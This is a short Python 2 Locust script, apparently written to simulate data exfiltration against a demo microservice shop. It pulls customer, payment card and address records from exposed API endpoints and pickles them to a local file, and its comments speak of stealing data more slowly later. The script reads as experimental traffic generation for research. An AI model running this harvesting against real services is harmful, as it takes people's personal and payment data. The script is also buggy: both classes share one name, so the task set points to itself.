import base64

from locust import HttpLocust, TaskSet, task
#from random import randint, choice
import random
import string
import cPickle as pickle
import time

class ExfilData(TaskSet):
    
    # This is going to be very simple
    # We are going to take some data via the exposed
    # Users API via a simple call to the API exposed
    # at the front-end service
    # NOTE: will need to adjust parameters (i.e. steal 
    # data more slowly) in the future probably
    # Note: I am putting this into a Locust script for 
    # now (instead of just a python script) to make
    # it easier to modify later (where Locust will probably
    # be important)
    @task
    def take_data(self):
        print "Starting..."
        # does this do anything....
        customers = self.client.get("/customers")
        print "customers: ", customers.text
        cards = self.client.get("/cards")
        print "cards: ", cards.text
        #### TODO : find a way to get addresses included here
        pickle.dump( [customers, cards], open( "./experimental_data/exfil_data_sock.pickle", "wb" ) )
        addresses = self.client.get("/addresses")
        print "addresses: ", addresses.text
        #pickle.dump( [customers, cards, addresses], open( "exfil_data_sock.pickle", "wb" ) )
        print "Pickle dumped..."
        #time.sleep(4)
        #print "Is anyone there??"
        #print "customers: ", customers.text
        #print "cards: ", cards.text
        #print "addresses: ", addresses.text

class ExfilData(HttpLocust):
    print "About to exfiltrate some data"
    min_wait = 0
    max_wait = 0
    task_set = ExfilData
